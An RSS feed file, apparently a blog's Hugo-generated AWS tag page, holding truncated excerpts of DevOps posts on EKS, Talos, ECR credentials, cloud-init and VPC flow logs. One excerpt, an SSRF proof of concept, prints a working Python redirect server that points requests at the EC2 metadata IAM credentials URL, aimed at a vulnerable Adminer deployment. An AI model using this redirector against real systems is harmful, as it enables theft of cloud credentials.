@@ -1,0 +1,196 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>AWS on Xiao.chen</title>
+    <link>https://blog.wisekee.com/tags/aws/</link>
+    <description>Recent content in AWS on Xiao.chen</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <copyright>Copyright © 2008–2020, Xiao.chen; all rights reserved.</copyright>
+    <lastBuildDate>Sun, 02 Jun 2024 00:00:00 +0000</lastBuildDate><atom:link href="https://blog.wisekee.com/tags/aws/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Talos launch kubernetes in aws environment getting started </title>
+      <link>https://blog.wisekee.com/post/talos-k8s-aws/</link>
+      <pubDate>Sun, 02 Jun 2024 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/talos-k8s-aws/</guid>
+      <description>
+        
+          
+            talos in aws
+the all talos nodes don&amp;rsquo;t enable public ip, can use private subnet and vpc ip cidr
+Operate workflow ​Installation the talosctl to operator machine talosctl Create aws resources VPC Subnet SecurityGroup NetworkLoadbalancer : listener tcp 443 forward to control plane nodes tcp: 6443 TargetGroup: for control plane port tcp: 6443 Setup the environment variables, the talosctl command generate config file need the Env Variables 1REGION=&amp;#34;us-east-1&amp;#34; 2VPC=&amp;#34;vpc-xxxxxx&amp;#34; 3SUBNET=&amp;#34;subnet-xxxxxx&amp;#34; 4AMI=`curl -sL https://github.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Dynamic create docker registry pull image credentials in eks cluster for particular  imagePullSecret</title>
+      <link>https://blog.wisekee.com/post/aws-ecr-register-helper/</link>
+      <pubDate>Mon, 20 Nov 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/aws-ecr-register-helper/</guid>
+      <description>
+        
+          
+            When use imagePullSecret to pull image from ecr in eks cluster for particular task etc. Istio WSAM plugin from ecr registry, need specific imagePullSecret
+Basic workflow create cronjob in eks cluster schedule login to ecr and obtain credentials create a secrets in some Namespaces named aws-registry save the docker pull credentals use this secrets in Namespace pull image specific imagePullSecret parameter for example: 1 spec: 2 imagePullPolicy: Always 3 imagePullSecret: aws-registry The Dockerfile to construct cronjob docker image 1FROM python:alpine 2MAINTAINER Mike Petersen &amp;lt;mike@odania-it.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Use AWS jsii to cross language invoker</title>
+      <link>https://blog.wisekee.com/post/aws-jsii-getting-started/</link>
+      <pubDate>Mon, 20 Nov 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/aws-jsii-getting-started/</guid>
+      <description>
+        
+          
+            You can generate Python, Java, and .NET software libraries from a TypeScript source use jsii of AWS Cloud Development Kit (AWS CDK).
+Initialization the project constructure 1pnpm init -y 2pnpm install --development jsii jsii-pacmak The package.json like following this 1{ 2 &amp;#34;name&amp;#34;: &amp;#34;jsii-demo&amp;#34;, 3 &amp;#34;version&amp;#34;: &amp;#34;1.0.0&amp;#34;, 4 &amp;#34;description&amp;#34;: &amp;#34;A demonstration jsii library&amp;#34;, 5 &amp;#34;main&amp;#34;: &amp;#34;index.js&amp;#34;, 6 &amp;#34;scripts&amp;#34;: { 7 &amp;#34;build&amp;#34;: &amp;#34;jsii&amp;#34;, 8 &amp;#34;build:watch&amp;#34;: &amp;#34;jsii --watch&amp;#34;, 9 &amp;#34;package&amp;#34;: &amp;#34;jsii-pacmak&amp;#34; 10 }, 11 &amp;#34;keywords&amp;#34;: [], 12 &amp;#34;author&amp;#34;: { 13 &amp;#34;name&amp;#34;: &amp;#34;John Doe&amp;#34;, 14 &amp;#34;email&amp;#34;: &amp;#34;john.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Custom the ec2 user data when instance launch</title>
+      <link>https://blog.wisekee.com/post/aws-ec2-userdata/</link>
+      <pubDate>Wed, 20 Sep 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/aws-ec2-userdata/</guid>
+      <description>
+        
+          
+            Usually, user data scripts are only run the first time the instance is started, however this can be changed using cloud-init to run every time the instance restarts.
+Create the cloud config file 1Content-Type: multipart/mixed; boundary=&amp;#34;//&amp;#34; 2MIME-Version: 1.0 3 4--// 5Content-Type: text/cloud-config; charset=&amp;#34;us-ascii&amp;#34; 6MIME-Version: 1.0 7Content-Transfer-Encoding: 7bit 8Content-Disposition: attachment; filename=&amp;#34;cloud-config.txt&amp;#34; 9 10#cloud-config 11cloud_final_modules: 12 - [scripts-user, always] 13runcmd: 14 - [ mkdir, /test-cloudinit ] 15write_files: 16 - path: /test-cloudinit/cloud-init.txt 17 content: Created by cloud-init 18 19--// 20Content-Type: text/x-shellscript; charset=&amp;#34;us-ascii&amp;#34; 21MIME-Version: 1.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>AWS metadata service v1 SSRF POC</title>
+      <link>https://blog.wisekee.com/post/aws-metadata-ssrf-poc/</link>
+      <pubDate>Thu, 10 Aug 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/aws-metadata-ssrf-poc/</guid>
+      <description>
+        
+          
+            POC process Construct attack machine to listener and redirect the credentials url 1#!/usr/bin/env python3 2 3 4# ./redirect.py 1337 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 5 6import sys 7from http.server import HTTPServer, BaseHTTPRequestHandler 8 9if len(sys.argv)-1 != 2: 10 print(&amp;#34;&amp;#34;&amp;#34; 11 Usage: {} &amp;lt;port_number&amp;gt; &amp;lt;url&amp;gt; 12 &amp;#34;&amp;#34;&amp;#34;.format(sys.argv[0])) 13 sys.exit() 14 15class Redirect(BaseHTTPRequestHandler): 16 def do_GET(self): 17 self.send_response(301) 18 self.send_header(&amp;#39;Location&amp;#39;, sys.argv[2]) 19 self.end_headers() 20 21HTTPServer((&amp;#34;&amp;#34;, int(sys.argv[1])), Redirect).serve_forever() Install the has vulnerability program for example: Adminer v4.7.8 1apiVersion: apps/v1 2kind: Deployment 3metadata: 4 # Unique key of the Deployment instance 5 name: adminer-v4.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>AWS EKS pod attach the SecurityGroup through SecurityGroupPolicy CRD</title>
+      <link>https://blog.wisekee.com/post/aws-eks-pod-sg/</link>
+      <pubDate>Thu, 20 Jul 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/aws-eks-pod-sg/</guid>
+      <description>
+        
+          
+            The EKS deployment should use ServiceAccount for pods
+Create the CR to eks cluster Control the access to Istio ingress gateway through bind the securitygroup to pod network interface.
+1apiVersion: vpcresources.k8s.aws/v1beta1 2kind: SecurityGroupPolicy 3metadata: 4 name: istio-internal-ingressgateway-sg 5 namespace: istio-system 6spec: 7 serviceAccountSelector: 8 matchLabels: 9 app: istio-internal-ingressgateway 10 securityGroups: 11 groupIds: 12 - sg-xxxxxxx 13 - sg-xxxxxxx 14 - sg-xxxxxxx 15 - sg-xxxxxxx 16 - sg-xxxxxxx Reference Security groups for Pods 
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>AWS EKS use farget nodes as pod runtime environments</title>
+      <link>https://blog.wisekee.com/post/aws-eks-farget-nodes/</link>
+      <pubDate>Mon, 20 Feb 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/aws-eks-farget-nodes/</guid>
+      <description>
+        
+          
+            For greater isolation and convenience, we can use farget as the run time environment for eks.
+Create eks farget execute role named: AmazonEKSFargatePodExecutionRole the TrustPolicy statements like following 1# trust policy 2{ 3 &amp;#34;Version&amp;#34;: &amp;#34;2012-10-17&amp;#34;, 4 &amp;#34;Statement&amp;#34;: [ 5 { 6 &amp;#34;Effect&amp;#34;: &amp;#34;Allow&amp;#34;, 7 &amp;#34;Principal&amp;#34;: { 8 &amp;#34;Service&amp;#34;: [ 9 &amp;#34;ssm.amazonaws.com&amp;#34;, 10 &amp;#34;eks-fargate-pods.amazonaws.com&amp;#34; 11 ] 12 }, 13 &amp;#34;Action&amp;#34;: &amp;#34;sts:AssumeRole&amp;#34;, 14 &amp;#34;Condition&amp;#34;: { 15 &amp;#34;ArnLike&amp;#34;: { 16 &amp;#34;aws:SourceArn&amp;#34;: &amp;#34;arn:aws:eks:us-east-1:{accountId}:fargateprofile/{clusterName}/*&amp;#34; 17 } 18 } 19 } 20 ] 21} attach the AWS managed policy to farget execution Role AmazonEKSClusterPolicy AmazonEKSFargatePodExecutionRolePolicy Create EKS farget profile in eks console select eks cluster and navigate the compute tab.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>AWS vpc flow logs insight</title>
+      <link>https://blog.wisekee.com/post/aws-logs-insight/</link>
+      <pubDate>Sat, 10 Dec 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/aws-logs-insight/</guid>
+      <description>
+        
+          
+            Define pattern for log groups in cloudwatch Create filter pattern filter pattern: [action, azid, bytes, dstaddr,dstport,instanceid,protocol,srcaddr,srcport,subnetid] Metric namespaces Name for metric namespace Metric name: bytes Metric value: $bytes Unit: Bytes Dimensions: Dimension Name: dst-addr, Dimension Value: $dstaddr Determine NAT gateway logs 1# if network interface format is: 2# ${version} ${account-id} ${interface-id} ${srcaddr} ${dstaddr} ${srcport} ${dstport} ${protocol} ${packets} ${bytes} ${start} ${end} ${action} ${log-status} 3fields @timestamp 4| parse @message &amp;#34;* * * * * * * * * *&amp;#34; as action, azid, bytes, dstaddr,dstport,instanceid,protocol,srcaddr,srcport,subnetid 5| stats sum(bytes) as bytesTransferred by srcaddr, dstaddr 6| sort bytesTransferred desc VPC transit gateway flow logs Create filter pattern [version, resource_type, account_id,tgw_id, tgw_attachment_id, tgw_src_vpc_account_id, tgw_dst_vpc_account_id, tgw_src_vpc_id, tgw_dst_vpc_id, tgw_src_subnet_id, tgw_dst_subnet_id, tgw_src_eni, tgw_dst_eni, tgw_src_az_id, tgw_dst_az_id, tgw_pair_attachment_id, srcaddr, dstaddr, srcport, dstport, protocol, packets, bytes,start,end, log_status, type,packets_lost_no_route, packets_lost_blackhole, packets_lost_mtu_exceeded, packets_lost_ttl_expired, tcp_flags,region, flow_direction, pkt_src_aws_service, pkt_dst_aws_service] Metric namespaces Name for metric namespace Metric name: bytes Metric value: $bytes Unit: Bytes Dimensions: Dimension Name: account_id, Dimension Value: $account_id Determine VPC transit gateway logs 1fields @timestamp 2 | parse @message &amp;#34;* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *&amp;#34; as version, resource_type, account_id,tgw_id, tgw_attachment_id, tgw_src_vpc_account_id, tgw_dst_vpc_account_id, tgw_src_vpc_id, tgw_dst_vpc_id, tgw_src_subnet_id, tgw_dst_subnet_id, tgw_src_eni, tgw_dst_eni, tgw_src_az_id, tgw_dst_az_id, tgw_pair_attachment_id, srcaddr, dstaddr, srcport, dstport, protocol, packets, bytes,start,end, log_status, type,packets_lost_no_route, packets_lost_blackhole, packets_lost_mtu_exceeded, packets_lost_ttl_expired, tcp_flags,region, flow_direction, pkt_src_aws_service, pkt_dst_aws_service 3| sort bytes desc 
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Quickly debug AWS App locally use Localstack(AWS Mock in local)</title>
+      <link>https://blog.wisekee.com/post/aws-local-development/</link>
+      <pubDate>Tue, 01 Sep 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/aws-local-development/</guid>
+      <description>
+        
+          
+            When you develop components locally that rely on AWS, it can be cumbersome to configure authentication information, and sometimes network latency. It is important to mock with a native AWS component, which can:localstack I&amp;rsquo;m using Docker-Compose here to start a set of tools that local development depends on：
+The docker-compose.yml looks like this following 1version: &amp;#39;3&amp;#39; 2 3services: 4 mongodb: 5 image: mongo:3.4.1 6 volumes: 7 - &amp;#39;./easymock/data/db:/data/db&amp;#39; 8 networks: 9 - easy-mock 10 ports: 11 - &amp;#34;27017:27017&amp;#34; 12 restart: always 13 container_name: mongodb 14 15 redis: 16 image: redis:4.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>AWS networking security enhance</title>
+      <link>https://blog.wisekee.com/post/aws-network-secrutiy-enhance/</link>
+      <pubDate>Sun, 05 May 2019 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/aws-network-secrutiy-enhance/</guid>
+      <description>
+        
+          
+            Vpc network division According to the requirements of the product and the customer, the two services of the two types of subnets are isolated. For example, DBsubnet01 and DBsubnet02 are both internal private subnets and belong to different product segments. ​	The two major subnet types are the intranet and the extranet. The internal network goes to the NAT Gateway, and the external network goes to the Internet Gateway. Like: RDS, Redis, background services, etc.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Use AWS CSM to monitoring the api call in your service</title>
+      <link>https://blog.wisekee.com/post/aws-client-side-monitoring/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/aws-client-side-monitoring/</guid>
+      <description>
+        
+          
+            Enable the aws CSM for application specific the following Environment Variables 1export AWS_CSM_ENABLED=true # or config the `~/.aws/config` include `csm_enabled = true` 2export AWS_CSM_HOST=10.0.0.1 # to send message to udp host 3export AWS_CSM_PORT=31000 # the CSM host port to listener 4export AWS_CSM_CLIENT_ID=appName # to set an identifier to differentiate multiple processes you might have configured to send to the same listener. Receive the message from client in local testing 1nc -luv localhost 31000 Receive the message from client use go code 1package main 2 3import ( 4	&amp;#34;encoding/json&amp;#34; 5	&amp;#34;fmt&amp;#34; 6	&amp;#34;log&amp;#34; 7	&amp;#34;net&amp;#34; 8	&amp;#34;os&amp;#34; 9	&amp;#34;os/signal&amp;#34; 10	&amp;#34;runtime&amp;#34; 11	&amp;#34;strconv&amp;#34; 12	&amp;#34;strings&amp;#34; 13	&amp;#34;syscall&amp;#34; 14) 15 16// ActionMessage is a struct representing a message from CSM 17type ActionMessage struct { 18	Version int `json:&amp;#34;Version&amp;#34;` 19	ClientID string `json:&amp;#34;ClientId&amp;#34;` 20	Type string `json:&amp;#34;Type&amp;#34;` 21	Service string `json:&amp;#34;Service&amp;#34;` 22	Action string `json:&amp;#34;Api&amp;#34;` 23	Timestamp int `json:&amp;#34;Timestamp&amp;#34;` 24	AttemptLatency int `json:&amp;#34;AttemptLatency&amp;#34;` 25	Fqdn string `json:&amp;#34;Fqdn&amp;#34;` 26	UserAgent string `json:&amp;#34;UserAgent&amp;#34;` 27	AccessKey string `json:&amp;#34;AccessKey&amp;#34;` 28	Region string `json:&amp;#34;Region&amp;#34;` 29	HTTPStatusCode int `json:&amp;#34;HttpStatusCode&amp;#34;` 30	FinalHTTPStatusCode int `json:&amp;#34;FinalHttpStatusCode&amp;#34;` 31	XAmzRequestID string `json:&amp;#34;XAmzRequestId&amp;#34;` 32	XAmzID2 string `json:&amp;#34;XAmzId2&amp;#34;` 33} 34 35func listen(connection *net.
+          
+          
+        
+      </description>
+    </item>
+    
+  </channel>
+</rss>
